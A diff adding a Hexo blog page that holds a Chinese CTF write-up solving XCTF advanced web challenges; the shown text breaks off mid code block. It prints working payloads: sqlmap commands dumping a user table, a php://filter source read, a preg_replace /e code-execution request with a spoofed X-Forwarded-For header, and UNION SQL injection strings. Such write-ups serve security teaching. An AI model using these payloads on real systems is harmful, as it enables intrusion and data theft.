@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KaynZ" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      XCTF WEB Advanced 
+      
+      
+      |
+    
+     L0ki&#39;s Website
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="L0ki's Website" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">L0ki</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/projects/">
+          <a href="/projects/">Projects</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">XCTF WEB Advanced</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-04-21 01:39:00
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/CTF/" title="CTF">
+                    #CTF
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="cat-抓住那只猫"><a href="#cat-抓住那只猫" class="headerlink" title="cat:抓住那只猫"></a>cat:抓住那只猫</h2><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1575112554428-a11f51c8-7284-4b2d-931b-7305e0dc7e63.png" alt="image.png"><br />在输入任何网站都无效的情况下，输入localhost<br /><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.nlark.com/yuque/0/2019/png/283368/1575112604627-3d81eb2c-c7b8-45da-98e8-8b9750f90e59.png" alt="image.png"><br />发现还是有回显的，进行Fuzz测试发现@未被过滤，会将@编码为%40<br />试一试宽字节，%bf<br /><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1575112743182-0eea4b5f-897a-4030-a945-dec36c0116b3.png" alt="image.png"><br />发现是一些HTML网页代码，带着好奇心，我打开了PHPSTUDY进行本地测试<br /><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1575112796316-97270c0c-cdb5-4603-b371-aa0d06ee954c.png" alt="image.png"><br />看到了熟悉的django报错页面，看来是将输入的参数传到了后端的django服务中进行解析，而django设置了编码为gbk导致错误编码了宽字符（超过了ascii码范围）。<br />看了一下大佬的WP发现@的作用是读取文件内容</p>
+<p><a name="Nz8qN"></a></p>
+<h2 id="ics-04"><a href="#ics-04" class="headerlink" title="ics-04"></a>ics-04</h2><p>有三个可以访问的功能，注册、登录和找回密码<br />注册功能：没有sql注入，一个账号可以重复注册漏洞<br />登录功能：没有sql注入，一个账号不同密码能够登录<br />找回密码功能：存在sql注入，payload：<br />![A2&#96;Y[TM(NN{(E]ICSQEHDBG.png](<a target="_blank" rel="noopener" href="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1576416559902-5f3c283d-4f95-4dad-9d07-473c685cb6d1.png">https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1576416559902-5f3c283d-4f95-4dad-9d07-473c685cb6d1.png</a>)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot;</span><br><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot; --dbs</span><br><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 --tables</span><br><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 -T user --columns</span><br><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 -T user -C username&amp;password --dump</span><br></pre></td></tr></table></figure>
+
+<p>得到账号：c3tlwDmIn23，密码：2f8667f381ff50ced6a3edc259260ba9<br />利用重复注册账号漏洞，注册账号c3tlwDmIn23，密码123456，登录成功，取得flag</p>
+<p><a name="zbcZl"></a></p>
+<h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>查看源码发现?page&#x3D;index，出现page这个get参数，联想到可能存在文件包含读源码的漏洞<br />尝试读取index.php的页面源码，通过php内置协议直接读取代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p><a name="8ljxr"></a></p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>base64解密之后，审计源码，分析得到如下关键部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><span class="line">if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a name="iFio8"></a></p>
+<h3 id="preg-replace函数"><a href="#preg-replace函数" class="headerlink" title="preg_replace函数"></a>preg_replace函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数作用：搜索subject中匹配pattern的部分， 以replacement进行替换。</span><br><span class="line">$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line">$replacement: 用于替换的字符串或字符串数组。</span><br><span class="line">$subject: 要搜索替换的目标字符串或字符串数组。</span><br></pre></td></tr></table></figure>
+
+<p>preg_replace函数存在命令执行漏洞<br />此处明显考察的是preg_replace 函数使用 <code>/e</code>模式，导致代码执行的问题。</p>
+<blockquote>
+<p>&#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p>
+</blockquote>
+<p>也就是说，pat和sub有相同部分，rep的代码就会执行。<br />根据源码分析X-Forwarded-For改成127.0.0.1之后，GET进三个参数。然后调用了preg_replace函数。并且没有对pat进行过滤，所以可以传入”&#x2F;e”触发漏洞<br><a name="X6BCi"></a></p>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>看到这样的代码我们可以这样构造payload:<br />在HTTP头添加：<br />X-Forwarded-For:127.0.0.1<br />&#x2F;index.php?pat&#x3D;&#x2F;a&#x2F;e&amp;rep&#x3D;system(‘ls’)&amp;sub&#x3D;a<br />从而爆出文件列<br />&#x2F;index.php?pat&#x3D;&#x2F;a&#x2F;e&amp;rep&#x3D;system(‘ls+文件名’)&amp;sub&#x3D;a<br />从而爆出该文件下的文件名<br />&#x2F;index.php?pat&#x3D;&#x2F;a&#x2F;e&amp;rep&#x3D;system(‘ls+文件名&#x2F;文件名’)&amp;sub&#x3D;a<br><a name="jI6kn"></a></p>
+<h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a><br />ics-06</h2><p>根据提示进入报表中心，发现url中id&#x3D;1,尝试爆破，发现当id&#x3D;2333时会有flag</p>
+<p><a name="UWZNk"></a></p>
+<h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h2><p>大名鼎鼎的彩票题，代码审计PHP弱类型，true和1的返回结果一样，所以直接构造：<br />{“action”:”buy”,”numbers”: [true,true,true,true,true,true,true]}</p>
+<p><a name="T1fDV"></a></p>
+<h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>不是xss就是sql，但是想到这是一道CTF题，xss的几率不大，所以直接尝试，<br />爆库(xxxx，爆表(xxx，爆列(xx，爆值(x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,1,database() #</span><br><span class="line">1&#x27; union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line">1&#x27; union select 1,1,group_concat(column_name) from information_schema.column where tabele_name=&#x27; xxx&#x27; #</span><br><span class="line">1&#x27; union select 1,1,xx from xxxx.xxx # </span><br><span class="line">or </span><br><span class="line">1&#x27;union select 1,1,group_concat(xx) from xxx #</span><br></pre></td></tr></table></figure>
+
+<p><a name="IrRZj"></a></p>
+<h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>代码注射题：<br />先用GitHack 将源码down下来<strong>assert()函数容易引起代码注射：</strong><br />eg:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line"> <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span 